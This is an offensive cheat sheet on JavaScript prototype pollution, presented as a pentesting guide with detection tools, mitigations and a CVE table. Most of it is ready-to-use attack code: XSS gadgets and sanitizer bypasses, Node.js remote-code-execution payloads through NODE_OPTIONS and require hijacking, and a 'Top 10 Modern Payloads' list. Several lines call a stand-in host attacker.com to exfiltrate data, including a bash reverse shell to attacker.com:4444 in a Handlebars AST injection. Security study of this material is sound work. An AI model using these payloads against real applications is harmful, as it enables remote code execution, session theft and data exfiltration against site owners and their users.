## 📋 Overview

**Prototype Pollution** is a JavaScript vulnerability where attackers inject properties into `Object.prototype` or constructor prototypes, affecting all objects that inherit from them. This can lead to:

- **Client-Side:** XSS, DOM manipulation, bypassing sanitizers
- **Server-Side (Node.js):** Remote Code Execution (RCE), privilege escalation, denial of service

**Why it matters:** Most JS objects inherit from `Object.prototype`, so polluting it impacts the entire application.

**Key Attack Vectors:**

- `__proto__` manipulation
- `constructor.prototype` pollution
- Deep merge/clone functions
- Query parameters, JSON inputs, or file uploads

---

## 🎯 Exploitation Methods

### **Step 1: Finding Prototype Pollution**

#### **Automatic Tools**

- **PPScan** (Browser Extension) - Auto-scans pages you visit
- **ppfuzz** - CLI tool for fuzzing (`ppfuzz 2.0` supports ES-modules, HTTP/2, WebSockets)
- **ppmap** - Automated scanner with payload generation
- **proto-find** - Detection tool
- **Burp Suite DOM Invader** (v2023.6+) - Dedicated Prototype Pollution tab
- **protoStalker** - Chrome DevTools plugin (2024) for real-time chain visualization

#### **Manual Detection Techniques**

**1. Debug Property Access**

```javascript
// Breakpoint when property is accessed
Object.defineProperty(Object.prototype, "testProp", {
  __proto__: null,
  get() {
    console.trace()
    return "detected"
  }
})
```

**2. Find Root Cause**

```javascript
// After finding pollution, track where it happens
function debugAccess(obj, prop, debugGet = true) {
  var origValue = obj[prop]
  Object.defineProperty(obj, prop, {
    get: function () {
      if (debugGet) debugger
      return origValue
    },
    set: function (val) {
      debugger
      origValue = val
    }
  })
}

debugAccess(Object.prototype, "pollutedKey")
```

**3. Search Vulnerable Keywords**

- `location.hash`, `location.search`, `decodeURIComponent`
- `merge`, `extend`, `clone`, `deepMerge`
- `Object.assign`, `_.merge` (Lodash), `$.extend` (jQuery)

---

### **Step 2: Exploitation - Client-Side**

#### **Basic XSS via Prototype Pollution**

**Pollute Global Objects (2023+ Browsers)**

```html
<script>
  // Pollute href property
  Object.prototype.href = 'javascript:alert(document.domain)';
  
  // Trigger via URL constructor
  new URL('#'); // Executes JS
</script>
```

**Modern Gadget Table (Tested 2024-11)**

|Gadget|Property|Result|
|---|---|---|
|`Notification`|`title`|Alert via notification click|
|`Worker`|`name`|JS exec in dedicated Worker|
|`Image`|`src`|Traditional `onerror` XSS|
|`URLSearchParams`|`toString`|DOM-based Open Redirect|

#### **Bypassing HTML Sanitizers**

**DOMPurify Bypass (CVE-2024-45801)**

```javascript
Object.prototype.after = maliciousFunction;
// Bypass SAFE_FOR_TEMPLATES profile
```

**sanitize-html Bypass**

```javascript
{"__proto__": {"innerHTML": "<img/src/onerror=alert(1)>"}}
```

**Closure Sanitizer**

```html
<script>
  Object.prototype['* ONERROR'] = 1;
  Object.prototype['* SRC'] = 1;
</script>
<script src="https://google.github.io/closure-library/source/closure/goog/base.js"></script>
<script>
  const html = '<img src onerror=alert(1)>';
  const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
  document.body.append(goog.dom.safeHtmlToNode(sanitizer.sanitize(html)));
</script>
```

#### **Finding Script Gadgets**

Search for dangerous functions:

```javascript
// Keywords to search in codebase
srcdoc, innerHTML, iframe, createElement, eval, Function
```

**Example: Mithril Library Gadget**

```javascript
// Pollute to inject HTML
settings["root"]["innerHTML"] = "<svg onload=alert(1)>"
settings["root"]["ownerDocument"]["body"]["innerHTML"] = "<svg onload=alert(document.domain)>"
```

---

### **Step 3: Exploitation - Server-Side (Node.js RCE)**

#### **PP2RCE via Environment Variables**

**Technique:** Pollute `NODE_OPTIONS` + `env` to inject code when `child_process` spawns

**Payload Template**

```javascript
{
  "__proto__": {
    "NODE_OPTIONS": "--require /proc/self/environ",
    "env": {
      "EVIL": "console.log(require('child_process').execSync('whoami').toString())//"
    }
  }
}
```

**Full Exploit**

```javascript
const { fork } = require('child_process');

// Pollution
const payload = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": {"EVIL": "console.log(require(\\"child_process\\").execSync(\\"touch /tmp/pwned\\").toString())//"}}}');

function merge(target, source) {
  for (let key in source) {
    if (typeof target[key] === 'object' && typeof source[key] === 'object') {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

merge({}, payload);

// Trigger RCE
fork('a_file.js'); // Creates /tmp/pwned
```

#### **PP2RCE via cmdline (Alternative)**

```javascript
{
  "__proto__": {
    "NODE_OPTIONS": "--require /proc/self/cmdline",
    "argv0": "console.log(require('child_process').execSync('id').toString())//"
  }
}
```

#### **Filesystem-less RCE via `--import` (Node ≥19)**

**Most Reliable Method (No Disk Access Needed)**

```javascript
const js = "require('child_process').execSync('wget https://attacker.com?exfil=success')";
const payload = `data:text/javascript;base64,${Buffer.from(js).toString('base64')}`;

Object.prototype.NODE_OPTIONS = `--import ${payload}`;

// Trigger
require('child_process').fork('./any_file.js');
```

**JSON Payload**

```json
{
  "__proto__": {
    "NODE_OPTIONS": "--import data:text/javascript;base64,cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCd0b3VjaCAvcG9sbHV0ZWQnKQ=="
  }
}
```

**Why `--import` is Better:**

- ✅ No filesystem writes
- ✅ Works with ESM-only environments
- ✅ Bypasses `--require` filters

---

### **Step 4: Forcing RCE Without Direct spawn()**

#### **Technique: Pollute require() Paths**

**If app uses `require()` after pollution, hijack it:**

**Find Vulnerable .js Files**

```bash
# Search for files that call child_process on import
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file; do
  grep -nE "^[a-zA-Z].*(exec\(|spawn\(|fork\()" "$file" | grep -v "function "
done
```

**Common Targets:**

- `/path/to/npm/scripts/changelog.js`
- `/opt/yarn-v1.22.19/preinstall.js`
- `node_modules/buffer/bin/download-node-tests.js`

**Absolute Require Hijack**

```javascript
// Pollute main attribute
{"__proto__": {"main": "/tmp/malicious.js"}}

// Trigger
require('bytes'); // Loads /tmp/malicious.js instead
```

**Relative Require Hijack (Method 1)**

```javascript
{
  "__proto__": {
    "exports": {".": "./malicious.js"},
    "1": "/tmp"
  }
}

require('./anything.js'); // Loads /tmp/malicious.js
```

**Relative Require Hijack (Method 2)**

```javascript
{
  "__proto__": {
    "data": {"exports": {".": "./malicious.js"}},
    "path": "/tmp",
    "name": "./target.js"
  }
}
```

---

### **Step 5: Express.js Specific Gadgets**

#### **Serve XSS via Content-Type Confusion**

**Payload**

```json
{"__proto__": {"_body": true, "body": "<script>alert(1)</script>"}}
```

**Result:** Express serves HTML instead of JSON, triggering XSS

#### **UTF-7 Rendering**

```json
{"__proto__": {"content-type": "application/json; charset=utf-7"}}
```

#### **Status Code Manipulation**

```json
{"__proto__": {"status": 510}}
```

#### **CORS Header Injection**

```json
{"__proto__": {"exposedHeaders": ["X-Custom-Header"]}}
```

---

## 🔥 Top 10 Modern Payloads

### **1. Client-Side XSS (Global URL Gadget)**

```javascript
Object.prototype.href = 'javascript:alert(origin)';
new URL('#');
```

### **2. Node.js RCE (Filesystem-less via --import)**

```json
{"__proto__":{"NODE_OPTIONS":"--import data:text/javascript;base64,cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjdXJsIGF0dGFja2VyLmNvbScpCg=="}}
```

### **3. Node.js RCE (Environment Variable)**

```json
{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": {"EVIL": "console.log(require('child_process').execSync('whoami').toString())//"}}}
```

### **4. Node.js RCE (cmdline Method)**

```json
{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
```

### **5. DOMPurify Bypass (CVE-2024-45801)**

```javascript
Object.prototype.after = function(){};
// Then inject malicious HTML
```

### **6. jQuery $.extend Bypass (CVE-2019-11358)**

```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin); // true
```

### **7. Lodash Bypass (CVE-2019-10744)**

```javascript
_.merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
```

### **8. Express Content-Type Confusion**

```json
{"__proto__": {"_body": true, "body": "<img src=x onerror=alert(1)>"}}
```

### **9. Array Index Pollution**

```javascript
Object.prototype[1] = "injected";
let arr = [];
arr[1]; // "injected"
```

### **10. DNS Exfiltration (Node.js)**

```json
{"__proto__": {"NODE_OPTIONS": "--inspect=attacker.oastify.com"}}
```

---

## 🚀 Higher Impact Techniques

### **AST Injection - Handlebars RCE**

```javascript
Object.prototype.type = "Program";
Object.prototype.body = [{
  type: "MustacheStatement",
  path: 0,
  params: [{
    type: "NumberLiteral",
    value: "process.mainModule.require('child_process').execSync('bash -i >& /dev/tcp/attacker.com/4444 0>&1')"
  }],
  loc: {start: 0, end: 0}
}];

// Compile template triggers RCE
Handlebars.precompile("{{msg}}");
```

### **AST Injection - Pug RCE**

```python
import requests
requests.post('http://target/vuln', json={
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('whoami')"
    }
})
```

### **VM Context Escape (Pre-Fixed Versions)**

```javascript
Object.prototype.contextExtensions = maliciousCode;
```

---

## 🛡️ Bypasses & Evasions

### **WAF Bypass - Split Domain**

```json
{"__proto__": {"NODE_OPTIONS": "--inspect=evil\"\".com"}}
```

### **Nested Pollution**

```json
{"constructor": {"prototype": {"isAdmin": true}}}
```

### **Pollution via Array**

```json
["__proto__", "polluted"] = ["key", "value"]
```

### **Case Variation**

```json
{"__PROTO__": {"polluted": true}}
{"constructor": {"PROTOTYPE": {"polluted": true}}}
```

---

## 🔒 Mitigations

### **Code-Level Fixes**

**1. Freeze Prototypes**

```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Map.prototype);
```

**2. Use Prototype-less Objects**

```javascript
const obj = Object.create(null); // No prototype
```

**3. Use Map Instead of Objects**

```javascript
const map = new Map();
map.set('key', 'value');
```

**4. Validate User Input**

```javascript
// Reject __proto__, constructor, prototype keys
if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
  throw new Error('Invalid key');
}
```

**5. Use Safe Libraries**

- Lodash ≥ 4.17.22
- deepmerge ≥ 5.3.0
- Use `structuredClone()` instead of custom deep merge

**6. Check Property Existence**

```javascript
if (Object.prototype.hasOwnProperty.call(obj, 'key')) {
  // Safe to use
}
```

### **Runtime Protection**

- **CSP:** `script-src 'self'; object-src 'none'`
- **Node.js flags:** Avoid passing `NODE_OPTIONS` from untrusted sources
- **Linters:** ESLint with security plugins

### **Detection Tools**

- **Burp Suite:** DOM Invader extension
- **Static Analysis:** Semgrep, CodeQL rules
- **npm audit:** Check for known vulnerable packages

---

## 🎯 Notable CVEs (2023-2025)

|CVE|Library|Impact|Fix|
|---|---|---|---|
|**CVE-2024-45801**|DOMPurify ≤3.0.8|XSS via `Node.prototype.after`|Use `Object.hasOwn()` checks|
|**CVE-2023-26136**|jQuery 3.6.0-3.6.3|PP via `extend()`|Upgrade to latest|
|**CVE-2019-11358**|jQuery <3.4.0|PP via `$.extend`|Upgrade to 3.4.0+|
|**CVE-2019-10744**|Lodash <4.17.12|PP via `_.merge`|Upgrade to 4.17.22+|
|**CVE-2019-7609**|Kibana|RCE via PP|Patch available|

---

## 📚 References & Tools

**Tools:**

- https://github.com/msrkp/PPScan
- https://github.com/BlackFan/client-side-prototype-pollution
- https://github.com/dwisiswant0/ppfuzz
- https://github.com/kleiton0x00/ppmap
- https://github.com/kosmosec/proto-find
- https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner

**Research Papers:**

- https://portswigger.net/research/server-side-prototype-pollution
- https://arxiv.org/pdf/2207.11171.pdf
- https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/

**Writeups:**

- https://blog.sonarsource.com/blitzjs-prototype-pollution/
- https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/
- https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2

---

**💡 Pro Tips:**

- Always test with `constructor.prototype` if `__proto__` is filtered
- Check `/proc/self/environ` and `/proc/self/cmdline` for Node.js targets
- Use `--import` for modern Node.js RCE (most reliable)
- Look for `merge`, `extend`, `clone` functions in source code
- Pollute array indices when direct object pollution fails

**Happy Hunting! 🎯**